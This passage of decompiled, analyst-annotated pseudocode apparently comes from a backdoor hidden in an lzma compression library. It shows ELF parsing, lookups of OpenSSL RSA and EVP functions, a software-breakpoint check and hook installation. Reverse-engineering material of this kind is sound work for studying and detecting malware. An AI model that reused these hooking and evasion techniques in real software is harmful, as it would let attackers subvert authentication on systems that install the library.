  undefined2 local_a20;
  byte local_a15;
  undefined4 local_a14;
  byte local_a10;
  uint local_a08;
  long local_a00;
  long local_9f0;
  undefined8 local_9d8;
  undefined4 local_9d0;
  undefined4 uStack_9cc;
  undefined2 local_9c8;
  byte local_9bd;
  undefined4 local_9bc;
  byte local_9b8;
  ulong local_9a8;
  long local_998;
  long local_980 [3];
  long local_968;
  undefined *local_950;
  undefined *local_948;
  undefined *local_940;
  undefined *local_938;
  long *local_930;
  long *local_928;
  undefined **local_920;
  undefined local_918 [256];
  undefined local_818 [256];
  undefined local_718 [256];
  undefined local_618 [256];
  long local_518 [32];
  undefined local_418 [112];
  undefined local_3a8 [8];
  long alStack_3a0 [72];
  long local_160;
  undefined8 local_158;
  long local_80;
  ulong local_60;
  ulong local_58;
  undefined local_48 [24];
  long local_30;
  
  bVar39 = 0;
  local_acc = 0;
  plVar11 = local_980;
  for (lVar22 = 0x256; lVar22 != 0; lVar22 = lVar22 + -1) {
    *(undefined4 *)plVar11 = 0;
    plVar11 = (long *)((long)plVar11 + 4);
  }
  puVar26 = local_918;
  lVar22 = *(long *)(param_1 + 0x80);
  local_948 = local_818;
  local_940 = local_718;
  local_938 = local_618;
  local_ac8 = 0;
  local_ac0 = 0;
  local_ab8 = 0;
  local_ab0 = 0;
  local_aa8 = 0;
  local_930 = local_518;
  local_950 = puVar26;
  local_928 = local_980;
  local_920 = &local_950;
  get_ehdr_address(lVar22);
  *(ulong *)(lVar22 + 0x18) = (ulong)*(byte *)(lVar22 + 0x10);
  uVar43 = *(ulong *)(*(long *)(lVar22 + 8) + 0x18 + (ulong)*(byte *)(lVar22 + 0x10) * 8);
  uVar31 = *(ulong *)(lVar22 + 0x28);
  lVar22 = uVar31 - uVar43;
  if (uVar31 <= uVar43) {
    lVar22 = uVar43 - uVar31;
  }
  if (lVar22 < 0x50001) {
    startptr = (void *)(uVar43 & 0xfffffffffffff000);
    pvVar1 = (void *)((long)startptr - 0x20000);
LAB_0010592f:
    iVar9 = table_get(startptr,(void *)0x0);
    if (iVar9 != 0x300) goto code_r0x00105940;
    local_a78 = &local_aa8;
    local_a70 = *(undefined8 *)(*(long *)(param_1 + 0x80) + 0x28);
    local_a88 = &local_950;
    local_a80 = startptr;
    iVar9 = parse_elf_invoke(&local_a88);
    if (iVar9 != 0) {
      local_30 = get_lzma_allocator(1);
      lVar22 = 0;
      do {
        local_48[lVar22] = *(undefined *)(local_30 + lVar22);
        lVar22 = lVar22 + 1;
      } while (lVar22 != 0x18);
      local_a58 = &local_ac0;
      local_a50 = &local_ab8;
      local_a48 = &local_ab0;
      local_a40 = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x38);
      local_a68 = local_980;
      local_a60 = &local_950;
      local_a38 = local_418;
      iVar9 = process_shared_libraries(&local_a68);
      if (iVar9 == 0) goto LAB_00105a3b;
      local_b10 = (undefined4 *)**(undefined8 **)(*(long *)(param_1 + 0x10) + 0x38);
      puVar24 = local_b10 + 0x4e;
      puVar29 = local_b10 + 0x146;
      ctx2 = (ctx2 *)(local_b10 + 0xa8);
      puVar28 = puVar24;
      for (lVar22 = 0x5a; lVar22 != 0; lVar22 = lVar22 + -1) {
        *puVar28 = 0;
        puVar28 = puVar28 + (ulong)bVar39 * -2 + 1;
      }
      *(undefined4 **)(local_b10 + 0x5a) = puVar29;
      lVar22 = *(long *)(param_1 + 0x10);
      *(ctx2 **)(local_b10 + 0x50) = ctx2;
      *(undefined4 **)(local_b10 + 0x56) = local_b10 + 0xf2;
      plVar11 = *(long **)(lVar22 + 0x38);
      *(undefined4 **)(local_b10 + 0x52) = local_b10 + 0x12a;
      lVar22 = *plVar11;
      uVar27 = *(undefined8 *)(lVar22 + 0x580);
      *(undefined8 *)(local_b10 + 0x88) = 0;
      *(long *)(local_b10 + 0x8a) = lVar22 + 0x588;
      *(undefined8 *)(local_b10 + 0x86) = uVar27;
      FUN_00102d10(puVar26,local_3a8);
      local_aa0 = 0;
      lVar22 = _Llzma_check_update_0(local_938,&local_aa0);
      if (lVar22 != 0) {
        *(long *)(local_b10 + 0x6e) = lVar22;
        *(long *)(local_b10 + 0x70) = lVar22 + local_aa0;
        puVar28 = local_b10;
        for (lVar22 = 0x4e; lVar22 != 0; lVar22 = lVar22 + -1) {
          *puVar28 = 0;
          puVar28 = puVar28 + (ulong)bVar39 * -2 + 1;
        }
        *(ctx2 **)(local_b10 + 0x4a) = ctx2;
        uVar27 = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x50);
        *(undefined8 *)(local_b10 + 0x44) = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x48);
        uVar2 = *(undefined8 *)(*(long *)(param_1 + 8) + 8);
        *(undefined8 *)(local_b10 + 0x48) = uVar27;
        *(undefined8 *)(local_b10 + 0x46) = uVar2;
        puVar28 = local_b10 + 0xf2;
        for (lVar22 = 0x38; lVar22 != 0; lVar22 = lVar22 + -1) {
          *puVar28 = 0;
          puVar28 = puVar28 + (ulong)bVar39 * -2 + 1;
        }
        *(undefined8 *)(local_b10 + 0xf6) = **(undefined8 **)(param_1 + 8);
        uVar27 = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x78);
        *(undefined8 *)(local_b10 + 0xf8) = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x70);
        *(undefined8 *)(local_b10 + 0xfa) = uVar27;
        for (lVar22 = 0x1a; lVar22 != 0; lVar22 = lVar22 + -1) {
          *puVar29 = 0;
          puVar29 = puVar29 + (ulong)bVar39 * -2 + 1;
        }
        *(undefined8 *)(local_b10 + 0x15e) = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x58);
        **(undefined8 **)(*(long *)(param_1 + 8) + 0x10) = puVar24;
        pcVar30 = ctx2;
        for (lVar22 = 0x4a; lVar22 != 0; lVar22 = lVar22 + -1) {
          *(undefined4 *)pcVar30 = 0;
          pcVar30 = (ctx2 *)((long)pcVar30 + (ulong)bVar39 * -8 + 4);
        }
        *(undefined8 *)(local_b10 + 0xae) = local_ac0;
        *(undefined8 *)(local_b10 + 0xb0) = local_ab8;
        *(undefined8 *)(local_b10 + 0xb2) = local_ab0;
        lVar22 = 0;
        do {
          *(undefined *)((long)local_b10 + lVar22 + 0x4a8) = local_418[lVar22];
          lVar22 = lVar22 + 1;
        } while (lVar22 != 0x70);
        *(undefined4 **)(local_b10 + 0xee) = local_b10 + 0x12a;
        *(undefined8 *)(local_b10 + 0x144) = local_aa8;
        lVar22 = get_lzma_allocator(1);
        *(undefined **)(lVar22 + 0x10) = local_940;
        fn_malloc_usable_size = lzma_alloc(0x440,lVar22);
        *(long *)(local_b10 + 300) = fn_malloc_usable_size;
        if (fn_malloc_usable_size != 0) {
          local_b10[0x12a] = local_b10[0x12a] + 1;
        }
        iVar9 = _Llzma_lz_decoder_init_0(&local_928,&local_ac8,local_b10,ctx2);
        if (iVar9 == 0) goto LAB_00105a42;
        fn_malloc_usable_size = get_lzma_allocator(1);
        *(long **)(fn_malloc_usable_size + 0x10) = local_930;
        plVar11 = local_930;
        if (local_930 != (long *)0x0) {
                    // Returns "RSA_get0_key"
          plVar11 = (long *)table_lookup_multi((long)local_930,0x798,0);
          fn_EVP_MD_CTX_new = (void *)lzma_alloc(0xaf8,fn_malloc_usable_size);
          *(void **)(local_b10 + 0xc6) = fn_EVP_MD_CTX_new;
          if (fn_EVP_MD_CTX_new != (void *)0x0) {
            local_b10[0xf0] = local_b10[0xf0] + 1;
          }
        }
        local_a30 = 0;
        local_9d8 = 0;
        puVar26 = local_950;
        lVar12 = _Llzma_check_update_0(local_950,&local_a30);
        lVar35 = local_a30 + lVar12;
        lVar13 = _Lmicrolzma_decode_0(puVar26,&local_9d8,0);
        *(long *)(local_b10 + 100) = lVar12;
        *(long *)(local_b10 + 0x66) = lVar35;
        *(long *)(local_b10 + 0x68) = lVar13;
        *(long *)(local_b10 + 0x6a) = local_9d8 + lVar13;
        lVar12 = _Llzma_lz_encoder_memusage_1(3);
        if (((lVar12 == 0) || (pcVar41 = *(code **)(lVar12 + 0x20), pcVar41 == (code *)0x0)) ||
           (*(long *)(lVar12 + 0x30) == 0)) goto LAB_00105a42;
        pcVar14 = (char *)0x0;
        lVar13 = (*pcVar41)(local_930,0x418);
        *(long *)(local_b10 + 0xec) = lVar13;
        if (lVar13 != 0) {
                    // Returns "BN_bin2bn"
          pcVar14 = table_lookup_multi((long)local_930,0xc40,0);
        }
        local_acc = 0x2c8;
        lVar13 = _Llzip_decode_0(local_950,&local_acc,0);
        *(long *)(local_b10 + 0x5c) = lVar13;
        if (lVar13 == 0) goto LAB_00105a42;
        local_acc = 0x710;
        lVar13 = _Llzip_decode_0(local_950,&local_acc,0);
        *(long *)(local_b10 + 0x5e) = lVar13;
        if (lVar13 == 0) goto LAB_00105a42;
        pcVar16 = (char *)0x0;
                    // Returns "BN_bn2bin"
        pcVar15 = table_lookup_ex(local_930,0x6d0);
        *(char **)(local_b10 + 0xe8) = pcVar15;
        if (pcVar15 != (char *)0x0) {
                    // Returns "BN_dup"
          pcVar15 = table_lookup_multi((long)local_930,0x958,0);
          if (pcVar15 != (char *)0x0) {
            lVar13 = *(long *)(pcVar15 + 8);
            lVar35 = *local_930;
            local_b10[0xf0] = local_b10[0xf0] + 1;
            *(long *)(local_b10 + 0xde) = lVar13 + lVar35;
          }
                    // Returns "RSA_new"
          pcVar16 = table_lookup_multi((long)local_930,0x918,0);
          if (*(long *)(local_b10 + 0xec) != 0) {
            local_b10[0xf0] = local_b10[0xf0] + 1;
          }
        }
                    // Returns "RSA_free"
        pcVar15 = table_lookup_multi((long)local_930,0xac0,0);
        lVar13 = (*pcVar41)(local_930,0x540);
        pcVar17 = (char *)0x0;
        *(long *)(local_b10 + 0xe2) = lVar13;
        if (lVar13 != 0) {
          local_b10[0xf0] = local_b10[0xf0] + 1;
                    // Returns "RSA_sign"
          pcVar17 = table_lookup_multi((long)local_930,0x8f8,0);
          if (plVar11 != (long *)0x0) {
            lVar13 = plVar11[1];
            lVar35 = *local_930;
            local_b10[0xf0] = local_b10[0xf0] + 1;
            *(long *)(local_b10 + 0xc0) = lVar13 + lVar35;
          }
        }
        if (*(long *)(local_b10 + 0xe8) != 0) {
          local_b10[0xf0] = local_b10[0xf0] + 1;
        }
        iVar9 = install_entries(local_950,local_930,local_3a8,ctx2,puVar24);
        if (iVar9 == 0) goto LAB_00105a42;
        if (pcVar14 != (char *)0x0) {
          lVar13 = *(long *)(pcVar14 + 8);
          lVar35 = *local_930;
          local_b10[0xf0] = local_b10[0xf0] + 1;
          *(long *)(local_b10 + 0xe0) = lVar13 + lVar35;
        }
        if (pcVar16 != (char *)0x0) {
          lVar13 = *(long *)(pcVar16 + 8);
          lVar35 = *local_930;
          local_b10[0xf0] = local_b10[0xf0] + 1;
          *(long *)(local_b10 + 0xdc) = lVar13 + lVar35;
        }
        if (pcVar15 != (char *)0x0) {
          lVar13 = *(long *)(pcVar15 + 8);
          lVar35 = *local_930;
          local_b10[0xf0] = local_b10[0xf0] + 1;
          *(long *)(local_b10 + 0xea) = lVar13 + lVar35;
        }
        if (pcVar17 != (char *)0x0) {
          lVar13 = *(long *)(pcVar17 + 8);
          lVar35 = *local_930;
          local_b10[0xf0] = local_b10[0xf0] + 1;
          *(long *)(local_b10 + 0xe6) = lVar13 + lVar35;
        }
                    // Returns "EVP_DecryptUpdate"
        pcVar14 = table_lookup_multi((long)local_930,0x3f0,0);
        uVar27 = 0;
        puVar37 = *(undefined8 **)(local_b10 + 0x56);
        local_a30 = 0;
        local_a98 = local_a98 & 0xffffffff00000000;
        *puVar37 = 0;
        *(undefined4 *)(puVar37 + 1) = 0;
        puVar26 = local_950;
        lVar35 = _Lmicrolzma_decode_0(local_950,&local_a30,0);
        lVar13 = local_a30;
        if ((lVar35 != 0) && (local_160 != 0)) {
          puVar37[0x15] = local_160;
          puVar37[0x16] = local_158;
          local_a98 = CONCAT44(local_a98._4_4_,0x400);
          puVar42 = puVar26;
          lVar18 = _Llzip_decode_0(puVar26,&local_a98,0);
          puVar37[0x1a] = lVar18;
          if ((lVar18 != 0) &&
             (iVar9 = FUN_00102a30(0x16,puVar37 + 5,puVar37 + 6,puVar37 + 7,puVar42,local_3a8,
                                   puVar24,puVar26), iVar9 == 0)) {
            puVar37[5] = 0;
            puVar37[6] = 0;
            puVar37[7] = 0;
          }
          local_a98 = CONCAT44(local_a98._4_4_,0x7b8);
          lVar18 = _Llzip_decode_0(puVar42,&local_a98,0);
          puVar37[0x1b] = lVar18;
          if (lVar18 != 0) {
            puVar26 = local_3a8;
            iVar9 = FUN_00102a30(0x17,puVar37 + 9,puVar37 + 10,puVar37 + 0xb,puVar42,puVar26,puVar24
                                 ,lVar18,puVar42,puVar24,puVar26);
            if (iVar9 == 0) {
              puVar37[9] = 0;
              puVar37[10] = 0;
              puVar37[0xb] = 0;
            }
            else {
              iVar9 = FUN_00102a30(0x18,puVar37 + 0xd,puVar37 + 0xe,puVar37 + 0xf,puVar42,puVar26,
                                   puVar24,uVar27,puVar42,puVar24,puVar26);
              if (iVar9 == 0) {
                puVar37[0xd] = 0;
                puVar37[0xe] = 0;
                puVar37[0xf] = 0;
              }
            }
          }
          if ((puVar37[5] != 0) || (puVar37[9] != 0)) {
            lVar18 = *(long *)(local_b10 + 0x56);
            local_9d8 = 0;
            lVar36 = *(long *)(lVar18 + 0x28);
            if (lVar36 == 0) {
              lVar36 = *(long *)(lVar18 + 0x48);
              if (lVar36 == 0) goto LAB_001065aa;
              uVar27 = *(undefined8 *)(lVar18 + 0x50);
            }
            else {
              uVar27 = *(undefined8 *)(lVar18 + 0x30);
            }
            bVar7 = false;
            lVar18 = 0;
            local_a90 = CONCAT44(local_a90._4_4_,0x198);
            while (lVar18 = _Llzip_decode_0(puVar42,&local_a90,lVar18), lVar18 != 0) {
              local_9d8 = 0;
              lVar19 = _Lstream_encoder_update_0(puVar42,lVar18,0,0,&local_9d8);
              if (lVar19 == 0) {
                local_9d8 = 0;
                bVar7 = true;
                lVar19 = _Lstream_encoder_update_1(puVar42,lVar18,0,0,&local_9d8);
              }
              while (lVar19 != 0) {
                do {
                  iVar9 = _Lauto_decode_1(puVar42,lVar19,8);
                  if ((iVar9 != 0) &&
                     (iVar9 = _Llzma_properties_size_0(lVar36,uVar27,0,0x109,lVar19), iVar9 != 0)) {
                    lVar18 = puVar37[5];
                    *(long *)(*(long *)(local_b10 + 0x56) + 0xa0) = lVar19;
                    if (lVar18 != 0) {
                      *(undefined4 *)((long)puVar37 + 4) = 1;
                    }
                    if ((puVar37[9] != 0) && (*(undefined4 *)puVar37 = 1, puVar37[0xd] != 0)) {
                      *(undefined4 *)(puVar37 + 1) = 1;
                    }
                    lVar13 = lVar13 + lVar35;
                    lVar18 = FUN_00102c40(0x11,local_3a8,lVar35,lVar13);
                    if (lVar18 != 0) {
                      *(long *)(*(long *)(local_b10 + 0x56) + 0xc0) = lVar18;
                    }
                    puVar37 = &local_9d8;
                    bVar7 = false;
                    local_9d0 = 0x70;
                    local_9d8 = 0xc5800000948;
                    goto LAB_0010646c;
                  }
                  if (bVar7) goto LAB_001063c3;
                  lVar19 = _Lstream_encoder_update_0(puVar42,lVar18,0,0,&local_9d8);
                } while (lVar19 != 0);
                local_9d8 = 0;
LAB_001063c3:
                lVar19 = _Lstream_encoder_update_1(puVar42,lVar18,0,0,&local_9d8);
                bVar7 = true;
              }
              lVar18 = lVar18 + 8;
            }
          }
        }
        goto LAB_001065aa;
      }
      goto LAB_00105a42;
    }
  }
LAB_00105a3b:
  local_b10 = (undefined4 *)0x0;
  goto LAB_00105a42;
code_r0x00105940:
  startptr = (void *)((long)startptr + -0x1000);
  if (startptr == pvVar1) goto LAB_00105a3b;
  goto LAB_0010592f;
LAB_0010646c:
  do {
    lVar18 = _Llzip_decode_0(puVar42,puVar37,0);
    if (lVar18 != 0) {
      if (bVar7) {
        *(undefined4 *)(*(long *)(local_b10 + 0x56) + 0xb8) = 1;
        goto LAB_001064b3;
      }
      bVar7 = true;
    }
    puVar37 = (undefined8 *)((long)puVar37 + 4);
  } while (puVar37 != (undefined8 *)&uStack_9cc);
  *(undefined4 *)(*(long *)(local_b10 + 0x56) + 0xb8) = 0;
LAB_001064b3:
  lVar13 = FUN_00102c40(0x15,local_3a8,lVar35,lVar13);
  if (lVar13 != 0) {
    if ((*(int *)(*(long *)(local_b10 + 0x56) + 0xb8) != 0) && (local_b10[0x4e] != 0)) {
      iVar9 = 0;
      lVar35 = 0;
      local_9d0 = 0x10;
      local_9d8 = 0xf0000000e;
      uVar43 = 0;
      do {
        uVar31 = (ulong)*(uint *)((long)&local_9d8 + lVar35 * 4);
        lVar18 = alStack_3a0[uVar31 * 4];
        if (lVar18 != 0) {
          lVar36 = alStack_3a0[uVar31 * 4 + 1];
          iVar9 = iVar9 + 1;
          iVar10 = _Lstream_encoder_mt_init_1(lVar18,lVar36,0,lVar13);
          iVar40 = (int)uVar43;
          if (iVar10 == 0) {
            iVar10 = _Llzma_simple_x86_decoder_init_1(lVar18,lVar36,0,lVar13);
            iVar40 = (int)uVar43;
            if (iVar10 == 0) goto LAB_00106588;
          }
          uVar43 = (ulong)(iVar40 + 1);
        }
LAB_00106588:
        lVar35 = lVar35 + 1;
      } while (lVar35 != 3);
      if ((iVar9 != 0) && ((int)uVar43 == 0)) goto LAB_001065aa;
    }
    *(long *)(*(long *)(local_b10 + 0x56) + 200) = lVar13;
  }
LAB_001065aa:
                    // Returns "EVP_DecryptFinal_ex"
  pcVar15 = table_lookup_multi((long)local_930,0x2a8,0);
  iVar9 = _Llzma_mf_bt4_find_0(local_950,local_3a8,puVar24);
  if (iVar9 == 0) {
    local_b10[0xf2] = 0;
    local_b10[0xf4] = 0;
  }
  puVar37 = *(undefined8 **)(local_b10 + 0x5a);
  *(undefined **)(lVar22 + 0x10) = local_940;
  local_a98 = 0;
  *puVar37 = 0;
  lVar22 = _Llzma_check_update_0(local_918,&local_a98);
  uVar43 = local_a98;
  if ((((lVar22 != 0) && (0x10 < local_a98)) && (local_80 != 0)) &&
     ((local_b10[0x4e] == 0 ||
      (iVar9 = check_software_breakpoint(local_80,local_80 + 4,0xe230), iVar9 != 0)))) {
    puVar37[0xb] = local_80;
    plVar11 = &local_a30;
    for (lVar13 = 0x16; lVar13 != 0; lVar13 = lVar13 + -1) {
      *(undefined4 *)plVar11 = 0;
      plVar11 = (long *)((long)plVar11 + (ulong)bVar39 * -8 + 4);
    }
    if (local_60 != 0) {
      local_b20 = 0;
      uVar38 = 0;
      uVar44 = local_58;
      uVar31 = local_60;
      do {
        while( true ) {
          if ((uVar44 <= uVar31) || ((local_b20 != 0 && (uVar38 != 0)))) goto LAB_00106beb;
          iVar9 = code_dasm(&local_a30,uVar31,uVar44);
          if (iVar9 != 0) break;
          uVar31 = uVar31 + 1;
        }
        if ((local_a08 & 0xfffffffd) == 0xb1) {
          if (local_a14._1_1_ != '\x03') goto LAB_00106730;
          if ((local_a20 & 0x1040) == 0) {
            if ((local_a20 & 0x40) != 0) {
              bVar8 = 0;
LAB_001067ca:
              bVar34 = local_a14._3_1_;
              if ((local_a20 & 0x20) != 0) {
                bVar34 = local_a14._3_1_ | (byte)((local_a15 & 1) << 3);
              }
              goto LAB_001067e8;
            }
            bVar34 = 0;
          }
          else {
            if ((local_a20 & 0x40) != 0) {
              bVar8 = (byte)(local_a14 >> 0x10);
              if ((local_a20 & 0x20) != 0) {
                bVar8 = bVar8 | local_a15 * '\x02' & 8;
              }
              goto LAB_001067ca;
            }
            bVar34 = local_a20._1_1_ & 0x10;
            if ((local_a20 & 0x1000) == 0) goto LAB_001067f6;
            bVar8 = local_a10;
            if ((local_a20 & 0x20) != 0) {
              bVar8 = local_a10 | (byte)((local_a15 & 1) << 3);
            }
            bVar34 = 0;
LAB_001067e8:
            if (bVar8 != bVar34) goto LAB_00106730;
          }
LAB_001067f6:
          uVar33 = 0;
          uVar5 = 0;
          uVar38 = 0;
          uVar25 = 0;
          puVar32 = &local_9d8;
          for (lVar13 = 0x16; uVar21 = uVar31, lVar13 != 0; lVar13 = lVar13 + -1) {
            *(undefined4 *)puVar32 = 0;
            puVar32 = (undefined8 *)((long)puVar32 + (ulong)bVar39 * -8 + 4);
          }
          for (; (uVar31 < uVar44 && (uVar5 < 5)); uVar5 = uVar5 + 1) {
            if ((uVar25 != 0) && (uVar38 != 0)) goto LAB_00106b37;
            iVar9 = _Llzma_filters_update_1(uVar31,uVar44,1,0);
            if (iVar9 == 0) break;
            if ((local_9c8 & 0x1040) != 0) {
              if ((local_9c8 & 0x40) == 0) {
                uVar33 = local_9c8._1_1_ & 0xffffff10;
                if (((local_9c8 & 0x1000) != 0) &&
                   (uVar33 = (uint)local_9b8, (local_9c8 & 0x20) != 0)) {
                  uVar33 = (uint)local_9bd << 3;
                  bVar8 = local_9b8;
                  goto LAB_001068df;
                }
              }
              else {
                uVar33 = (uint)local_9bc._2_1_;
                if ((local_9c8 & 0x20) != 0) {
                  uVar33 = (uint)local_9bd * 2;
                  bVar8 = local_9bc._2_1_;
LAB_001068df:
                  uVar33 = (uint)bVar8 | uVar33 & 8;
                }
              }
            }
            uVar31 = uVar38;
            if ((bVar34 == (byte)uVar33) && ((local_9c8 & 0x100) != 0)) {
              uVar23 = local_9a8;
              if ((local_9bc & 0xff00ff00) == 0x5000000) {
                uVar23 = local_9a8 + local_9d8 + CONCAT44(uStack_9cc,local_9d0);
              }
              local_a90 = 0;
              uVar20 = _Lmicrolzma_decode_0(local_918,&local_a90,0);
              if ((((uVar20 == 0) || (local_a90 + uVar20 <= uVar23)) || (uVar23 < uVar20)) ||
                 (((uVar23 == uVar38 && (uVar23 == uVar25)) || (uVar31 = uVar23, uVar25 != 0))))
              goto LAB_00106992;
            }
            else {
LAB_00106992:
              uVar23 = uVar25;
              uVar38 = uVar31;
            }
            uVar31 = CONCAT44(uStack_9cc,local_9d0) + local_9d8;
            uVar25 = uVar23;
          }
          if ((uVar25 == 0) || (uVar38 == 0)) {
LAB_00106aac:
            uVar38 = 0;
            local_b20 = 0;
            uVar31 = uVar21;
          }
          else {
LAB_00106b37:
            iVar9 = FUN_00102af0(uVar25,uVar38,lVar22,lVar22 + uVar43);
            local_b20 = uVar25;
            uVar31 = uVar21;
            if (iVar9 != 0) {
              puVar37[7] = uVar25;
              puVar37[8] = uVar38;
              *(undefined4 *)((long)puVar37 + 4) = 1;
              local_9d8 = CONCAT44(local_9d8._4_4_,0x708);
              lVar22 = _Llzip_decode_0(local_918,&local_9d8,0);
              puVar37[2] = lVar22;
              if (lVar22 != 0) {
                local_9d8 = CONCAT44(local_9d8._4_4_,0x790);
                lVar22 = _Llzip_decode_0(local_918,&local_9d8,0);
                puVar37[3] = lVar22;
                if (lVar22 != 0) {
                  local_9d8 = CONCAT44(local_9d8._4_4_,0x4f0);
                  lVar22 = _Llzip_decode_0(local_918,&local_9d8,0);
                  puVar37[4] = lVar22;
                  if (lVar22 != 0) {
                    local_9d8 = CONCAT44(local_9d8._4_4_,0x1d8);
                    lVar22 = _Llzip_decode_0(local_918,&local_9d8,0);
                    puVar37[5] = lVar22;
                    if (lVar22 != 0) {
                      local_9d8 = CONCAT44(local_9d8._4_4_,0xb10);
                      lVar22 = _Llzip_decode_0(local_918,&local_9d8,0);
                      puVar37[6] = lVar22;
                      if (lVar22 != 0) break;
                    }
                  }
                }
              }
              *(undefined4 *)puVar37 = 1;
              break;
            }
          }
        }
        else if ((((local_a08 == 0x147) && (local_a14 >> 8 == 0x50000)) &&
                 ((local_a20 & 0x800) != 0)) && (local_9f0 == 0)) {
          uVar25 = 0;
          if ((local_a20 & 0x100) != 0) {
            uVar25 = local_a00 + local_a30 + local_a28;
          }
          local_9d8 = 0;
          uVar21 = _Lmicrolzma_decode_0(local_918,&local_9d8,0);
          if (((uVar21 != 0) && (uVar25 < local_9d8 + uVar21)) && (uVar21 <= uVar25)) {
            puVar32 = &local_9d8;
            for (lVar13 = 0x16; uVar21 = uVar31, lVar13 != 0; lVar13 = lVar13 + -1) {
              *(undefined4 *)puVar32 = 0;
              puVar32 = (undefined8 *)((long)puVar32 + (ulong)bVar39 * -8 + 4);
            }
            do {
              iVar9 = _Llzma_properties_size_0(uVar31,uVar44,&local_9d8);
              if (iVar9 == 0) break;
              if ((local_998 == 0) && ((local_9c8 & 0x100) != 0)) {
                uVar38 = local_9a8;
                if ((local_9bc & 0xff00ff00) == 0x5000000) {
                  uVar38 = local_9a8 + local_9d8 + CONCAT44(uStack_9cc,local_9d0);
                }
                local_a90 = 0;
                uVar31 = _Lmicrolzma_decode_0(local_918,&local_a90,0);
                if ((((uVar31 != 0) && (uVar38 < local_a90 + uVar31)) && (uVar31 <= uVar38)) &&
                   (uVar25 != uVar38)) goto LAB_00106b37;
              }
              uVar31 = CONCAT44(uStack_9cc,local_9d0) + local_9d8;
            } while (uVar31 < uVar44);
            goto LAB_00106aac;
          }
        }
LAB_00106730:
        uVar31 = uVar31 + local_a28;
      } while( true );
    }
  }
LAB_00106beb:
  *(long **)(fn_malloc_usable_size + 0x10) = local_930;
  if (pcVar14 != (char *)0x0) {
    lVar22 = *(long *)(pcVar14 + 8);
    lVar13 = *local_930;
    local_b10[0xf0] = local_b10[0xf0] + 1;
    *(long *)(local_b10 + 0xd4) = lVar22 + lVar13;
  }
  if (pcVar15 != (char *)0x0) {
    lVar22 = *(long *)(pcVar15 + 8);
    lVar13 = *local_930;
    local_b10[0xf0] = local_b10[0xf0] + 1;
    *(long *)(local_b10 + 0xd6) = lVar22 + lVar13;
  }
  iVar9 = FUN_00102870(ctx2);
  if (((((((iVar9 != 0) &&
          (lzma_free(*(undefined8 *)(local_b10 + 0xc6),fn_malloc_usable_size),
          local_b10[0x12a] == 0xc)) && (iVar9 = apply_one_entry_ex(1,0x145,0x7f,0x18), iVar9 != 0))
        && ((iVar9 = apply_one_entry_ex(*(undefined8 *)(*(long *)(param_1 + 0x10) + 0x40),0x12a,4,
                                        0x12), iVar9 != 0 &&
            (iVar9 = apply_one_entry(0x12e,0x13,4,0x20,
                                     *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x48)), iVar9 != 0)
            ))) &&
       (iVar9 = apply_one_entry_ex(*(undefined8 *)(*(long *)(param_1 + 8) + 8),0x132,6,0x14),
       iVar9 != 0)) &&
      ((iVar9 = apply_one_entry(0x138,0x15,2,0x10,*(undefined8 *)(*(long *)(param_1 + 0x10) + 0x50))
       , iVar9 != 0 &&
       (iVar9 = apply_one_entry(0xee,0x10,0x26,0x20,
                                *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x70)), iVar9 != 0))))
     && ((iVar9 = apply_one_entry(0x140,0x17,5,0x20,
                                  *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x78)), iVar9 != 0 &&
         (((iVar9 = apply_one_entry(0x13a,0x16,6,0x20,**(undefined8 **)(param_1 + 8)), iVar9 != 0 &&
           (iVar9 = apply_one_entry(0x114,0x11,0x16,0x10,*(undefined8 *)(lVar12 + 0x30)), iVar9 != 0
           )) && (local_b10[0xa6] == 0x1c8)))))) {
    **(undefined8 **)(local_b10 + 0x3e) = local_b10;
    puVar24 = (undefined4 *)(local_980[0] + local_ac8 + 8);
    uVar4 = *puVar24;
    *(undefined4 **)(local_b10 + 0x14) = puVar24;
    local_b10[0x16] = uVar4;
    *puVar24 = 2;
    **(byte **)(local_b10 + 0x18) = **(byte **)(local_b10 + 0x18) | *(byte *)(local_b10 + 0x1a);
    puVar24 = (undefined4 *)(local_ac8 + 8 + local_968);
    uVar4 = *puVar24;
    *(undefined4 **)(local_b10 + 0x10) = puVar24;
    local_b10[0x12] = uVar4;
    *puVar24 = 1;
    puVar24 = local_b10 + 0x20;
    for (lVar22 = 0x1e; lVar22 != 0; lVar22 = lVar22 + -1) {
      *puVar24 = 0;
      puVar24 = puVar24 + (ulong)bVar39 * -2 + 1;
    }
    *(undefined8 *)(local_b10 + 0x28) = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x40);
    **(undefined8 **)(local_b10 + 0x1c) = local_b10 + 0x20;
    **(undefined4 **)(local_b10 + 0x1e) = 1;
    fn_malloc_usable_size = 0;
    lVar22 = local_30;
    while (lVar22 != 0) {
      *(undefined *)(local_30 + fn_malloc_usable_size) = local_48[fn_malloc_usable_size];
      lVar22 = fn_malloc_usable_size + -0x17;
      fn_malloc_usable_size = fn_malloc_usable_size + 1;
    }
    uVar27 = 1;
    plVar11 = local_980;
    for (lVar22 = 0x256; lVar22 != 0; lVar22 = lVar22 + -1) {
      *(undefined4 *)plVar11 = 0;
      plVar11 = (long *)((long)plVar11 + (ulong)bVar39 * -8 + 4);
    }
    puVar37 = *(undefined8 **)(param_1 + 0x80);
    goto LAB_00105a80;
  }
LAB_00105a42:
  puVar26 = local_48;
  FUN_00102750(local_b10);
  fn_malloc_usable_size = 0;
  lVar22 = local_30;
  while (lVar22 != 0) {
    *(undefined *)(local_30 + fn_malloc_usable_size) = puVar26[fn_malloc_usable_size];
    lVar22 = fn_malloc_usable_size + -0x17;
    fn_malloc_usable_size = fn_malloc_usable_size + 1;
  }
  uVar27 = 0;
  plVar11 = local_980;
  for (lVar22 = 0x256; lVar22 != 0; lVar22 = lVar22 + -1) {
    *(undefined4 *)plVar11 = 0;
    plVar11 = (long *)((long)plVar11 + (ulong)bVar39 * -8 + 4);
  }
  puVar37 = *(undefined8 **)(param_1 + 0x80);
LAB_00105a80:
  _Llzma_block_param_decoder_0(puVar37,uVar27);
  *puVar37 = 1;
  puVar37[1] = 0;
  puVar37[2] = 0;
  puVar37[3] = 0;
  puVar37[4] = 0;
  piVar3 = (int *)cpuid_basic_info(0);
  uVar5 = piVar3[2];
